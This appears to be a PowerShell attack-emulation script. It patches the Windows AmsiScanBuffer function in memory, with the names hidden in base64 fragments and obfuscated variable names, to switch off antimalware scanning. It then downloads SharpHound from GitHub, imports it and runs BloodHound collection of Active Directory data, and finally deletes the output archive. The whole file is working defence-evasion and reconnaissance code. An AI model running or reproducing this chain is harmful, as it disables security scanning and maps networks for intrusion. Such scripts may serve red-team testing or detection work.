$line1 = "using System;"
$line2 = "using System.Runtime.InteropServices;"
$line3 = "public class Win32 {"
$line4 = "[DllImport(`"kernel32`")]"
$line5 = "public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);"
$line6 = "[DllImport(`"kernel32`")]"
$line7 = "public static extern IntPtr LoadLibrary(string name);"
$line8 = "[DllImport(`"kernel32`")]"
$line9 = "public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);"
$line10 = "}"

$exec_line = $line1 + "`n" + $line2 + "`n" + $line3 + "`n" + $line4 + "`n" + $line5 + "`n" + $line6 + "`n" + $line7 + "`n" + $line8 + "`n" + $line9 + "`n" + $line10
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($exec_line)
$EncodedText =[Convert]::ToBase64String($Bytes)
${kasdnfasdf} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedText)))
Add-Type ${kasdnfasdf}
${lkmjymlt} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
${oiwuaefnhoiewm} = [Win32]::GetProcAddress(${lkmjymlt}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
${lkaknfmklad} = 0
[Win32]::VirtualProtect(${oiwuaefnhoiewm}, [uint32]5, 0x40, [ref]${lkaknfmklad})
${olmsdfvnodifngon} = [Byte[]] (0x66, 0xB8, 0x01, 0x00, 0xC2, 0x18, 0x00)
[System.Runtime.InteropServices.Marshal]::Copy(${olmsdfvnodifngon}, 0, ${oiwuaefnhoiewm}, 7)

Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "c:\test\SharpHound.ps1"
write-host "Import and Execution of SharpHound.ps1 from c:\test" -ForegroundColor Cyan
import-module c:\test\SharpHound.ps1
Invoke-BloodHound -OutputDirectory $env:Temp
Remove-Item $env:Temp\*BloodHound.zip -Force
